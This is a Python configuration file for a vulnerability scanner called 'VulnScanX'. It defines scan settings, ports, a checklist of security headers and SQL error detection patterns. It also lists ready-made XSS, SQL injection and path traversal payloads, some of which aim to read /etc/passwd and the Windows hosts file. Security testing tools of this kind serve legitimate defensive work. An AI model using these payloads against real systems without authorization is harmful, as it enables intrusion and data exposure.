"""
VulnScanX - Core Configuration
================================
Central configuration management for the entire framework.
"""

import os
import json
from dataclasses import dataclass, field
from typing import List, Optional
from pathlib import Path

# ─────────────────────────────────────────────
#  BASE PATHS
# ─────────────────────────────────────────────
BASE_DIR = Path(__file__).resolve().parent.parent
TEMPLATES_DIR = BASE_DIR / "templates"
REPORTS_DIR = BASE_DIR / "reports" / "output"
LOGS_DIR = BASE_DIR / "logs"
WORDLISTS_DIR = BASE_DIR / "utils" / "wordlists"

# Ensure runtime directories exist
for _dir in [REPORTS_DIR, LOGS_DIR, WORDLISTS_DIR]:
    _dir.mkdir(parents=True, exist_ok=True)


# ─────────────────────────────────────────────
#  SEVERITY LEVELS
# ─────────────────────────────────────────────
class Severity:
    CRITICAL = "CRITICAL"
    HIGH = "HIGH"
    MEDIUM = "MEDIUM"
    LOW = "LOW"
    INFO = "INFO"

    SCORE_MAP = {
        CRITICAL: 9.0,
        HIGH: 7.0,
        MEDIUM: 4.0,
        LOW: 2.0,
        INFO: 0.0,
    }

    COLOR_MAP = {
        CRITICAL: "#FF0000",
        HIGH: "#FF6600",
        MEDIUM: "#FFAA00",
        LOW: "#FFFF00",
        INFO: "#00AAFF",
    }

    ORDER = [CRITICAL, HIGH, MEDIUM, LOW, INFO]


# ─────────────────────────────────────────────
#  SCAN CONFIGURATION
# ─────────────────────────────────────────────
@dataclass
class ScanConfig:
    target: str = ""
    scan_type: str = "full"           # full | recon | vuln | quick
    threads: int = 10
    timeout: int = 10                 # seconds per request
    rate_limit: int = 50              # requests per second
    follow_redirects: bool = True
    verify_ssl: bool = False
    user_agent: str = "VulnScanX/2.0 (Security Research)"
    headers: dict = field(default_factory=dict)
    cookies: dict = field(default_factory=dict)
    proxy: Optional[str] = None
    depth: int = 2                    # crawl depth
    wordlist: str = "common.txt"
    ports: List[int] = field(default_factory=lambda: [
        21, 22, 23, 25, 53, 80, 110, 135, 139, 143,
        443, 445, 993, 995, 1723, 3306, 3389, 5900, 8080, 8443
    ])
    output_formats: List[str] = field(default_factory=lambda: ["json", "html"])
    modules: List[str] = field(default_factory=lambda: [
        "recon", "ports", "headers", "xss", "sqli", "traversal"
    ])
    verbose: bool = False
    ai_analysis: bool = True


# ─────────────────────────────────────────────
#  GLOBAL SETTINGS
# ─────────────────────────────────────────────
BANNER = r"""
 ██╗   ██╗██╗   ██╗██╗     ███╗   ██╗███████╗ ██████╗ █████╗ ███╗   ██╗██╗  ██╗
 ██║   ██║██║   ██║██║     ████╗  ██║██╔════╝██╔════╝██╔══██╗████╗  ██║╚██╗██╔╝
 ██║   ██║██║   ██║██║     ██╔██╗ ██║███████╗██║     ███████║██╔██╗ ██║ ╚███╔╝ 
 ╚██╗ ██╔╝██║   ██║██║     ██║╚██╗██║╚════██║██║     ██╔══██║██║╚██╗██║ ██╔██╗ 
  ╚████╔╝ ╚██████╔╝███████╗██║ ╚████║███████║╚██████╗██║  ██║██║ ╚████║██╔╝ ██╗
   ╚═══╝   ╚═════╝ ╚══════╝╚═╝  ╚═══╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝
                                                          v2.0 | @VulnScanX
            Advanced Vulnerability Scanning & Penetration Testing Framework
        ⚠️  FOR AUTHORIZED SECURITY TESTING ONLY — USE RESPONSIBLY ⚠️
"""

VERSION = "2.0.0"
AUTHOR = "VulnScanX Security Team"
LICENSE = "MIT"

# HTTP headers used for scanning
DEFAULT_HEADERS = {
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate",
    "Connection": "keep-alive",
}

# CVSS Base Score thresholds
CVSS_THRESHOLDS = {
    "CRITICAL": (9.0, 10.0),
    "HIGH": (7.0, 8.9),
    "MEDIUM": (4.0, 6.9),
    "LOW": (0.1, 3.9),
    "INFO": (0.0, 0.0),
}

# XSS payloads for testing
XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "javascript:alert('XSS')",
    "<svg onload=alert('XSS')>",
    "'><script>alert(document.domain)</script>",
    "\"><script>alert(1)</script>",
    "<body onload=alert(1)>",
    "<iframe src=javascript:alert(1)>",
    "<%2Fscript><script>alert(1)<%2Fscript>",
    "<details open ontoggle=alert(1)>",
    "'-confirm(1)-'",
    "<math><mtext></table><img src=1 onerror=alert(1)>",
]

# SQLi payloads
SQLI_PAYLOADS = {
    "error_based": [
        "'",
        "''",
        "`",
        "``",
        ",",
        '"',
        "\\",
        "1'",
        "1''",
        "' OR '1'='1",
        "' OR '1'='1'--",
        "' OR '1'='1'/*",
        "1 OR 1=1",
        "1' ORDER BY 1--",
        "1' ORDER BY 2--",
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
    ],
    "time_based": [
        "'; WAITFOR DELAY '0:0:5'--",
        "1; WAITFOR DELAY '0:0:5'--",
        "'; SELECT SLEEP(5)--",
        "1' AND SLEEP(5)--",
        "1 AND SLEEP(5)",
        "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
        "1; SELECT pg_sleep(5)--",
    ],
    "boolean_based": [
        "' AND 1=1--",
        "' AND 1=2--",
        "1 AND 1=1",
        "1 AND 1=2",
    ],
}

# Directory traversal payloads
TRAVERSAL_PAYLOADS = [
    "../etc/passwd",
    "../../etc/passwd",
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "../../../../../etc/passwd",
    "..%2F..%2Fetc%2Fpasswd",
    "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "....//....//etc/passwd",
    "..%252f..%252fetc%252fpasswd",
    "..%c0%af..%c0%afetc%c0%afpasswd",
    "/etc/passwd",
    "C:\\Windows\\System32\\drivers\\etc\\hosts",
    "..\\..\\Windows\\System32\\drivers\\etc\\hosts",
]

# Security headers to check
SECURITY_HEADERS = {
    "Strict-Transport-Security": {
        "description": "HTTP Strict Transport Security (HSTS)",
        "required": True,
        "severity": Severity.MEDIUM,
    },
    "Content-Security-Policy": {
        "description": "Content Security Policy (CSP)",
        "required": True,
        "severity": Severity.MEDIUM,
    },
    "X-Frame-Options": {
        "description": "Clickjacking Protection",
        "required": True,
        "severity": Severity.MEDIUM,
    },
    "X-Content-Type-Options": {
        "description": "MIME Sniffing Protection",
        "required": True,
        "severity": Severity.LOW,
    },
    "X-XSS-Protection": {
        "description": "XSS Filter",
        "required": False,
        "severity": Severity.LOW,
    },
    "Referrer-Policy": {
        "description": "Referrer Policy",
        "required": True,
        "severity": Severity.LOW,
    },
    "Permissions-Policy": {
        "description": "Permissions Policy",
        "required": True,
        "severity": Severity.LOW,
    },
    "Cache-Control": {
        "description": "Cache Control",
        "required": True,
        "severity": Severity.INFO,
    },
}

# Error patterns indicating SQLi vulnerability
SQL_ERROR_PATTERNS = [
    "sql syntax",
    "mysql_fetch",
    "mysql_num_rows",
    "mysql_query",
    "pg_query",
    "sqlite_query",
    "ora-01756",
    "oracle error",
    "microsoft sql server",
    "odbc sql server driver",
    "sql server error",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "you have an error in your sql syntax",
    "warning: mysql",
    "supplied argument is not a valid mysql",
    "invalid query",
    "db2 sql error",
    "sybase",
    "jdbc",
    "[plpgsql error]",
    "psycopg2",
    "sqlite3.operationalerror",
    "dynamic sql error",
    "data type mismatch",
]
